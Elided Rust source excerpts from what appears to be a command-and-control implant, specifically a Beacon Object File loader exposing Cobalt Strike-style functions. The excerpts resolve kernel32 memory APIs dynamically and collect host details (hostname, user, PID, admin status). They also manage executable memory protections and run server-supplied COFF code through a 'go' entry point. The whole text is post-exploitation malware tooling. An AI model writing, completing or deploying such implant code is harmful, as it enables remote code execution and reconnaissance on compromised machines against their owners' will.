...
unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
    let a = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
...
unsafe fn virtual_free() -> Option<VirtualFreeFn> {
    let a = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualFree")?;
    Some(core::mem::transmute(a))
}
...
unsafe fn vq_readable(addr: usize, len: usize) -> bool {
    ...
    let Some(a) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualQuery") else {
        return false;
    };
...
pub unsafe extern "C" fn BeaconIsAdmin() -> i32 {
    nyx_implant_core::hostinfo::is_admin() as i32
}
...
pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
    ...
    if let Some(addr) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
...
pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
    ...
    let host = info_cstr(&raw mut INFO_HOST, &nyx_implant_core::hostinfo::hostname());
    let user = info_cstr(&raw mut INFO_USER, &nyx_implant_core::hostinfo::username());
    (*info).version = BEACON_INFO_VERSION;
    (*info).pid = nyx_implant_core::hostinfo::pid();
    (*info).hostname = host;
    (*info).user = user;
    (*info).isadmin = nyx_implant_core::hostinfo::is_admin() as i32;
}
            ...
            unsafe {
                ...
                if s.is_rx {
                    ...
                    if (self.protect)(p, s.size, PAGE_READWRITE, &mut old) == 0 {
                        ...
                        nyx_implant_core::diag::diag_mark(b"WARN_BOF_REPROTECT_RW");
                    } else {
                ...
                if (self.free)(p, 0, MEM_RELEASE) == 0 {
                    nyx_implant_core::diag::diag_mark(b"WARN_BOF_SECTION_FREE");
                }
            }
        }
    }
...
unsafe fn RtlZeroMemory(ptr: *mut c_void, len: usize) {
    ...
    // region.
    if let Some(addr) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RtlZeroMemory") {
...
fn run_entry_addr(coff: &nyx_coff::Coff<'_>, bases: &[u64]) -> Result<u64, Response> {
    ...
    // WP-B2: `section_number` is raw server-controlled COFF data; reject an
    // out-of-range section instead of indexing `bases` out of bounds
    // (panic=abort would kill the beacon). Same guard as run_map_symbols.
    if entry_sym.section_number as usize > bases.len() {
        return Err(Response::Err(String::from(
            "BOF entry `go` section out of range",
        )));
    }
...
unsafe fn run_selftest_trace(entry_addr: u64, bases: &[u64]) {
    ...
    // Raw pointer into the fixture statics — the slice methods would
    // auto-ref a static mut (static_mut_refs lint); copy through the raw
    // pointer instead. Single-threaded selftest, written only here and read
    // only by nyx_selftest_bof_trace after the task completes.
    let trace_bytes = &raw mut TRACE_BYTES as *mut u8;
    ...
    if vq_readable(e as usize, 0x30) {
        status |= 1;
        ptr::copy_nonoverlapping(e, trace_bytes, 16);
        ptr::copy_nonoverlapping(e.add(0x11), trace_bytes.add(16), 4);
        ptr::copy_nonoverlapping(e.add(0x1e), trace_bytes.add(20), 4);
        ...
        if vq_readable(tgt as usize, 8) {
            status |= 2;
            ptr::copy_nonoverlapping(tgt as *const u8, trace_bytes.add(24), 8);
        }
    }
